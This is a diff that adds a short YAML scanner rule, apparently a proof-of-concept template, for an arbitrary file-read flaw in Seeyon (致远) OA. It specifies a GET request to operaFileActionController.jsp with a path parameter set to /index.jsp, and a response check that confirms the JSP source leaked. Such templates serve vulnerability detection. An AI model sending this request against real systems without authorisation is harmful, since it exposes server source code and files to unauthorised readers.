@@ -1,0 +1,12 @@
+name: 致远OA-operaFileActionController-readfile
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find
+    follow_redirects: false
+    expression:
+      status: 200
+      body_all: ["response.setHeader"]
